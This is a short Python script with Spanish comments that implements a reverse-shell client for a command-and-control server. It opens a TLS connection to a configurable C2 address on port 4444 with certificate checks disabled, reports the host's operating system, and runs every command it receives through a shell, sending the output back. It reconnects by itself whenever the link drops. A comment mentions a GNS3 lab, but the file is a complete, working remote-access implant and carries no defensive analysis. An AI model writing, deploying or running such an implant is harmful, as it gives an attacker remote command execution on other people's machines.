import socket
import ssl
import subprocess
import time
import platform

SERVER_IP   = "127.0.0.1"  # <-- IP del servidor C2 en GNS3
SERVER_PORT = 4444


def conectar():
    while True:
        try:
            # Contexto TLS cliente — acepta cert autofirmado del servidor
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn = context.wrap_socket(raw, server_hostname=SERVER_IP)
            conn.connect((SERVER_IP, SERVER_PORT))

            # Envía info del OS al conectarse
            os_info = f"{platform.system()} {platform.release()}"
            conn.send(os_info.encode())

            print(f"[+] Conectado al servidor {SERVER_IP}:{SERVER_PORT} (TLS)")
            return conn
        except Exception as e:
            print(f"[-] Error: {e} — reintentando en 5s...")
            time.sleep(5)


def main():
    while True:
        conn = conectar()
        try:
            while True:
                data = conn.recv(4096).decode(errors="replace").strip()
                if not data:
                    break
                print(f"[*] Ejecutando: {data}")
                try:
                    resultado = subprocess.check_output(
                        data, shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=10
                    ).decode(errors="replace")
                except subprocess.TimeoutExpired:
                    resultado = "[!] Timeout"
                except Exception as e:
                    resultado = f"[!] Error: {str(e)}"

                conn.send(resultado.encode())
        except:
            print("[-] Conexión perdida, reconectando...")
            conn.close()


if __name__ == "__main__":
    main()
